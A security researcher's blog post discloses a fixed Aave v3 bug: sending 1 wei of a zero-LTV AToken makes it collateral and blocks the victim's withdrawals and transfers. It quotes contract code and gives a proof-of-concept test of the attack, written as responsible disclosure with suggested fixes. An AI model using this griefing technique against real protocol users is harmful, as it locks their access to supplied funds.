---
title: 'Aave v3 bug bounty part 3: `LTV-0` `AToken` poison attack!'
excerpt: An attacker can poison a user by sending just `1 wei` of an `AToken` with LTV equal to 0. When the victim has been poisoned, it won't be able to perform vital operations like `withdraw`, `transfer` or `setUserUseReserveAsCollateral` if such operations involve a non-0-LTV `AToken`.
coverImage:
  url: '/assets/blog/aave.png'
  credit:
    name: Aave.com
    url: https://aave.com/
date: '2023-09-03T17:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/aave.png'
---

**Important Note: each of the issue I have found have been already fixed and deployed with the release of Aave 3.0.2**

On May 15th 2023, Aave have officially [released a post on their Governance forum](https://governance.aave.com/t/bgd-bug-bounties-proposal/13077) to disclose different bug bounty submissions. **Three** of them have been submitted by me, and you can't understand how much proud of myself I am right now!

For each issue that I have disclosed, I will create a blog post with an in-depth explanation about it. Let's deep dive into the first one!

I don't remember currently which snapshot of the GitHub codebase was deployed at the time of the bug bounty, so I'm going to pick one that is as much recent but that still contains the bug: [https://github.com/aave/aave-v3-core/blob/94e571f3a7465201881a59555314cd550ccfda57](https://github.com/aave/aave-v3-core/blob/94e571f3a7465201881a59555314cd550ccfda57)

## Summary of the issue

An attacker can poison a user by sending just `1 wei` of an `AToken` with LTV equal to 0. When the victim has been poisoned, it won't be able to perform vital operations like `withdraw`, `transfer` or `setUserUseReserveAsCollateral` if such operations involve a non-0-LTV `AToken`.

## Detailed explanation

With Aave v3, Aave has introduced a mechanic that allows them to set an `AToken` LTV to zero, reducing the borrowing power of the underlying asset.

When the user owns at least an `AToken` with LTV equal 0 and that `AToken` is used as collateral, Aave will restrict some of the interactions that the user can have with the protocol.

Let's assume that the user is healthy (health factor >= 1) and that all the "normal" checks involved with each of the operations would pass. Let's also assume that the user has also some borrow position opened.

With this context and those assumptions, these operations will revert

- User tries to withdraw a non-0-LTV `AToken` via `Pool.withdraw`
- User tries to transfer a non-0-LTV `AToken` via `AToken.transfer`
- User attempt to set a non-0-LTV `AToken` as non-collateral `Pool.setUserUseReserveAsCollateral`

The "griefing attack" patterns are enabled by:

- Aave allows the supply of 0-LTV `AToken` (this is not a requirement, the attacker could have already owned an asset that has then become a 0-LTV `AToken`)
- Aave allows the transfer of 0-LTV `AToken`
- Aave automatically set the `AToken` received by the `receiver` as collateral if the `receiver` does not own any balance of that token

Once received, the victim will experience all the reverts I previously described.

Let's make a practical example

- `aDAI` is an `AToken` with LTV equal to 0
- Alice is the victim
- Bob is the attacker
- Alice supplies 100 `AAVE` to Aave
- Alice supplies 1000 `wETH` to Aave
- Alice borrows 100 `USDC` from Aave
- Bob supplies 100 `DAI` to Aave

At this point, Bob (the attacker) sends `1 wei `of `aDAI` to Alice, Aave allows the operation because Bob has no debt and there's nothing that prevents him from doing that. Because Alice does not own any `aDAI`, their new `aDAI` balance will be automatically set as collateral.

You can follow the execution of this procedure by looking at the code of [`Pool.finalizeTransfer`](https://github.com/aave/aave-v3-core/blob/94e571f3a7465201881a59555314cd550ccfda57/contracts/protocol/pool/Pool.sol#L588-L614) that is called by [`AToken._transfer`](https://github.com/aave/aave-v3-core/blob/94e571f3a7465201881a59555314cd550ccfda57/contracts/protocol/tokenization/AToken.sol#L208-L228).

```solidity
function finalizeTransfer(
    address asset,
    address from,
    address to,
    uint256 amount,
    uint256 balanceFromBefore,
    uint256 balanceToBefore
) external virtual override {
  require(msg.sender == _reserves[asset].aTokenAddress, Errors.CALLER_NOT_ATOKEN);

    SupplyLogic.executeFinalizeTransfer(
      _reserves,
      _reservesList,
      _eModeCategories,
      _usersConfig,
      DataTypes.FinalizeTransferParams({
        asset: asset,
        from: from,
        to: to,
        amount: amount,
        balanceFromBefore: balanceFromBefore,
        balanceToBefore: balanceToBefore,
        reservesCount: _reservesCount,
        oracle: ADDRESSES_PROVIDER.getPriceOracle(),
        fromEModeCategory: _usersEModeCategory[from]
      })
    );
}
```

At this point, the function will call [`SupplyLogic.executeFinalizeTransfer`](https://github.com/aave/aave-v3-core/blob/94e571f3a7465201881a59555314cd550ccfda57/contracts/protocol/libraries/logic/SupplyLogic.sol#L164-L227)

```solidity
function executeFinalizeTransfer(
    mapping(address => DataTypes.ReserveData) storage reservesData,
    mapping(uint256 => address) storage reservesList,
    mapping(uint8 => DataTypes.EModeCategory) storage eModeCategories,
    mapping(address => DataTypes.UserConfigurationMap) storage usersConfig,
    DataTypes.FinalizeTransferParams memory params
) external {
    DataTypes.ReserveData storage reserve = reservesData[params.asset];

    ValidationLogic.validateTransfer(reserve);

    uint256 reserveId = reserve.id;

    if (params.from != params.to && params.amount != 0) {
      DataTypes.UserConfigurationMap storage fromConfig = usersConfig[params.from];

      if (fromConfig.isUsingAsCollateral(reserveId)) {
        if (fromConfig.isBorrowingAny()) {
          ValidationLogic.validateHFAndLtv(
            reservesData,
            reservesList,
            eModeCategories,
            usersConfig[params.from],
            params.asset,
            params.from,
            params.reservesCount,
            params.oracle,
            params.fromEModeCategory
          );
        }
        if (params.balanceFromBefore == params.amount) {
          fromConfig.setUsingAsCollateral(reserveId, false);
          emit ReserveUsedAsCollateralDisabled(params.asset, params.from);
        }
      }

      if (params.balanceToBefore == 0) {
        DataTypes.UserConfigurationMap storage toConfig = usersConfig[params.to];
        if (
          ValidationLogic.validateUseAsCollateral(
            reservesData,
            reservesList,
            toConfig,
            reserve.configuration
          )
        ) {
          toConfig.setUsingAsCollateral(reserveId, true);
          emit ReserveUsedAsCollateralEnabled(params.asset, params.to);
        }
      }
    }
}
```

Even if the attacker would have something borrowed, the [`ValidationLogic.validateHFAndLtv`](https://github.com/aave/aave-v3-core/blob/94e571f3a7465201881a59555314cd550ccfda57/contracts/protocol/libraries/logic/ValidationLogic.sol#L581-L609) done inside the [`fromConfig.isUsingAsCollateral(reserveId)`](https://github.com/aave/aave-v3-core/blob/94e571f3a7465201881a59555314cd550ccfda57/contracts/protocol/libraries/configuration/UserConfiguration.sol#L98-L113) would pass because the `from` (that is also owning an LTV-0 asset) is transferring an AToken that has `reserve.configuration.getLtv() == 0` (see `ValidationLogic.validateHFAndLtv`).

Because the receiver does not own the `AToken` transferred, the [`ValidationLogic.validateUseAsCollateral`](https://github.com/aave/aave-v3-core/blob/94e571f3a7465201881a59555314cd550ccfda57/contracts/protocol/libraries/logic/ValidationLogic.sol#L689-L712) will pass and the `AToken` will be set as collateral for the receiving user.

At this point, Alice will not be able anymore to

- Withdraw her `AAVE` token previously supplied
- Withdraw her `wETH` token previously supplied
- Transfer her `AAVE` token previously supplied
- Transfer her `wETH` token previously supplied
- Set `AAVE` tokens as non-collateral
- Set `wETH` tokens as non-collateral (in this very specific example it would fail because after the operation her HF would not be healthy, but this is not relevant for our example)

In general, as we said, all the withdrawal/transfer/set as non-collateral operations that do not involve a 0-LTV `AToken` would revert.

At this point, the only options that she can do to solve the problem are:

- Withdraw the `aDAI` `AToken`
- Transfer the `aDAI` `AToken` to someone else
- (she could also set it as non-collateral, and we will see this option at the end, but I think that she should be able to "remove" the asset totally from her wallet if she really wanted)

As soon as one of those operations is done, Alice would not own anymore the "poisoned" `AToken` and as a consequence, Aave will set `aDAI` as non-collateral for Alice. Alice now can perform the operations that she couldn't do before (when "poisoned").

The attacker at this point can again send `1 wei` of `aDAI` to Alice, and she would be poisoned again, and she would need to perform the withdrawal/transfer again. You can see that this is just an infinite loop of bad experiences for Alice.

The only thing that Alice can do is to:

1. withdraw/transfer the "poisoned amount" and leave only (that's simply what is needed) `1 wei` of balance
2. set the "poisoned `AToken`" as non-collateral

By owning at least 1 wei and having it set to non-collaral, the next time that the attacker transfers the "poisoned AToken", Aave **will not automatically** set it as collateral.

## Conclusions, possible solutions and suggestions

Here are some suggestions/possible solutions that Aave could apply to solve the issue

- Do not automatically turn the received AToken as collateral (when the balance is 0) or at least do not do that if the received AToken is an AToken with LTV = 0.
- Change the error code that is thrown in `ValidationLogic.validateHFAndLtv` to be more meaningful and different from the other instances of `LTV_VALIDATION_FAILED` reverts. This would allow the Aave website and integrators to better understand why it's failing

## Test to showcase the griefing attack and the possible solution that the victim could adopt

```solidity
import { expect } from 'chai';
import { BigNumber, utils } from 'ethers';
import { MAX_UINT_AMOUNT, ZERO_ADDRESS } from '../helpers/constants';
import { ProtocolErrors, RateMode } from '../helpers/types';
import { convertToCurrencyDecimals } from '../helpers/contracts-helpers';
import { makeSuite, SignerWithAddress, TestEnv } from './helpers/make-suite';
import { getReserveData, getUserData } from './helpers/utils/helpers';
import './helpers/utils/wadraymath';
import { AToken, evmRevert, evmSnapshot, MintableERC20, Pool, waitForTx, WETH9Mocked } from '@aave/deploy-v3';

makeSuite('POC AToken with LTV 0 Griefing attack', (testEnv: TestEnv) => {
  const { INVALID_HF, LTV_VALIDATION_FAILED } = ProtocolErrors;

  let snap: string;

  before(async () => {
    const { addressesProvider, oracle } = testEnv;
    await waitForTx(await addressesProvider.setPriceOracle(oracle.address));
    snap = await evmSnapshot();
  });

  after(async () => {
    const { aaveOracle, addressesProvider } = testEnv;
    await waitForTx(await addressesProvider.setPriceOracle(aaveOracle.address));
  });

  it('POC EXECUTION', async () => {
    await evmRevert(snap);
    snap = await evmSnapshot();

    // Initial configuration

    // DAI = AToken with LTV = 0
    // AAVE = AToken with LTV > 0
    // USDC = AToken with LTV > 0
    // WETH = AToken with LTV > 0
    const {
      helpersContract,
      oracle,
      configurator,
      pool,
      poolAdmin,
      dai,
      aave,
      usdc,
      weth,
      aDai,
      aWETH,
      users: [user1, user2, user3, randomEOA, usdcSupplier],
    } = testEnv;

    // Set DAI as an underlying with LTV = 0
    expect(await configurator.configureReserveAsCollateral(dai.address, 0, 8000, 10500))
      .to.emit(configurator, 'CollateralConfigurationChanged')
      .withArgs(dai.address, 0, 8000, 10500);
    const ltv = (await helpersContract.getReserveConfigurationData(dai.address)).ltv;
    expect(ltv).to.be.equal(0);

    // user2 supply some AAVE (AToken with LTV > 0) to later be able to set as non-collateral
    const aaveSupplyAmount = utils.parseUnits('100', 18);
    expect(await aave.connect(user2.signer)['mint(uint256)'](aaveSupplyAmount));
    expect(await aave.connect(user2.signer).approve(pool.address, MAX_UINT_AMOUNT));
    expect(await pool.connect(user2.signer).supply(aave.address, aaveSupplyAmount, user2.address, 0));

    // user2 supplies 1000 WETH (AToken with LTV > 0)
    const wethSupplyAmount = utils.parseUnits('1000', 18);
    expect(await weth.connect(user2.signer)['mint(uint256)'](wethSupplyAmount));
    expect(await weth.connect(user2.signer).approve(pool.address, MAX_UINT_AMOUNT));
    expect(await pool.connect(user2.signer).supply(weth.address, wethSupplyAmount, user2.address, 0));

    // usdcSupplier supply some USDC to allow user2 to borrow them
    const usdcSupplyAmount = utils.parseUnits('1000', 6);
    expect(await usdc.connect(usdcSupplier.signer)['mint(uint256)'](usdcSupplyAmount));
    expect(await usdc.connect(usdcSupplier.signer).approve(pool.address, MAX_UINT_AMOUNT));
    expect(await pool.connect(usdcSupplier.signer).supply(usdc.address, usdcSupplyAmount, usdcSupplier.address, 0));

    // user2 borrow 100 USDC (AToken with LTV > 0)
    const usdcToBorrow = utils.parseUnits('100', 6);
    expect(await pool.connect(user2.signer).borrow(usdc.address, usdcToBorrow, RateMode.Variable, 0, user2.address));

    // user1 mint some DAI (AToken with LTV == 0)
    let daiSupplyAmount = utils.parseUnits('100', 18);
    expect(await dai.connect(user1.signer)['mint(uint256)'](daiSupplyAmount));
    expect(await dai.connect(user1.signer).approve(pool.address, MAX_UINT_AMOUNT));
    expect(await pool.connect(user1.signer).supply(dai.address, daiSupplyAmount, user1.address, 0));

    // user1 transfer 1 wei of those AToken to user 2
    await aDai.connect(user1.signer).transfer(user2.address, 1);

    // Test that the transfer/withdraw/set as non-collateral operations are not allowed when the victim owns a LTV-0 AToken
    await performNotAllowedOperations(pool, weth, aWETH, aave, user2, user3);

    // user2 decide to withdraw those LTV-0 Atoken -> balance 0, token set as non-collateral
    await pool.connect(user2.signer).withdraw(dai.address, MAX_UINT_AMOUNT, user2.address);
    expect(await dai.balanceOf(user2.address)).to.be.eq(1);

    // Now user2 could perform the actions but the Griefing attack can be repeated
    await aDai.connect(user1.signer).transfer(user2.address, 1);
    // Test that the transfer/withdraw/set as non-collateral operations are not allowed when the victim owns a LTV-0 AToken
    await performNotAllowedOperations(pool, weth, aWETH, aave, user2, user3);

    // user2 decide to transfer to another address those LTV-0 Atoken -> balance 0, token set as non-collateral
    await aDai.connect(user2.signer).transfer(randomEOA.address, 1);
    expect(await aDai.balanceOf(user2.address)).to.be.eq(0);
    expect(await aDai.balanceOf(randomEOA.address)).to.be.eq(1);

    // Now user2 could perform the actions but the Griefing attack can be repeated
    await aDai.connect(user1.signer).transfer(user2.address, 1);
    // Test that the transfer/withdraw/set as non-collateral operations are not allowed when the victim owns a LTV-0 AToken
    await performNotAllowedOperations(pool, weth, aWETH, aave, user2, user3);

    // transfer the LTV-0 token just to "reset" the balance of the poisoned token and showcase
    // what the user2 have to do to be able to be not-poisoned anymore in the future
    await aDai.connect(user2.signer).transfer(randomEOA.address, 1);

    // The only solution is to leave at least 1 wei of balance of the LTV-0 AToken and set them as non-collateral
    daiSupplyAmount = utils.parseUnits('1', 18);
    expect(await dai.connect(user2.signer)['mint(uint256)'](daiSupplyAmount));
    expect(await dai.connect(user2.signer).approve(pool.address, MAX_UINT_AMOUNT));

    // supply some DAI to be able to own the LTV-0 AToken
    expect(await pool.connect(user2.signer).supply(dai.address, daiSupplyAmount, user2.address, 0));

    // Set the LTV-0 AToken as non-collateral to prevent the problems
    await pool.connect(user2.signer).setUserUseReserveAsCollateral(dai.address, false);

    // now even if the attacker try to poison the user2 again, the DAI will not be-automatically set as collateral by Aave
    // user1 transfer 1 wei of those AToken to user 2
    await aDai.connect(user1.signer).transfer(user2.address, 1);

    // And user2 will be able finally to perfroms those operations that were reverting before
    // Try to perform the operations that were failing before
    await pool.connect(user2.signer).withdraw(weth.address, 1, user2.address);
    await aWETH.connect(user2.signer).transfer(user3.address, 1);
    await pool.connect(user2.signer).setUserUseReserveAsCollateral(aave.address, false);
  });

  const performNotAllowedOperations = async (
    pool: Pool,
    weth: WETH9Mocked,
    aWETH: AToken,
    aave: MintableERC20,
    victim: SignerWithAddress,
    otherUser: SignerWithAddress
  ) => {
    // user2 cannot withdraw non-LTV-0 collateral
    await expect(pool.connect(victim.signer).withdraw(weth.address, 1, victim.address)).to.be.revertedWith(
      LTV_VALIDATION_FAILED
    );

    // user2 cannot transfer non-LTV-0 AToken
    await expect(aWETH.connect(victim.signer).transfer(otherUser.address, 1)).to.be.revertedWith(LTV_VALIDATION_FAILED);

    // user2 cannot set as non-collateral non-LTV-0 AToken
    await expect(pool.connect(victim.signer).setUserUseReserveAsCollateral(aave.address, false)).to.be.revertedWith(
      LTV_VALIDATION_FAILED
    );
  };
});
```
